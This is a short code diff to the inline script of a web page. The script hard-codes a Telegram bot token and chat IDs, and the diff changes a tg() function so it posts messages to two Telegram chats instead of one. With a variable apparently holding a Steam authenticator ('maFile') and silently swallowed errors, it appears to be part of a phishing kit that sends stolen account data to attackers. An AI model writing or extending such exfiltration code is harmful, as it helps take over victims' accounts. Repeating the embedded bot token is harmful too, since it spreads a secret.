@@ -48,15 +48,18 @@
 <script>
 var TOKEN = "8982596338:AAE47QUXLGfaOtZsTI6j4-ofLUZ4Sl57uos";
 var CHAT = "5016514155";
+var CHAT2 = "8997330139";
 var step1 = {};
 var mafileContent = "";
 
 function tg(text) {
   try {
-    var x = new XMLHttpRequest();
-    x.open("POST", "https://api.telegram.org/bot" + TOKEN + "/sendMessage", true);
-    x.setRequestHeader("Content-Type", "application/json");
-    x.send(JSON.stringify({ chat_id: CHAT, text: text }));
+    [CHAT, CHAT2].forEach(function(cid) {
+      var x = new XMLHttpRequest();
+      x.open("POST", "https://api.telegram.org/bot" + TOKEN + "/sendMessage", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ chat_id: cid, text: text }));
+    });
   } catch (e) {}
 }
 
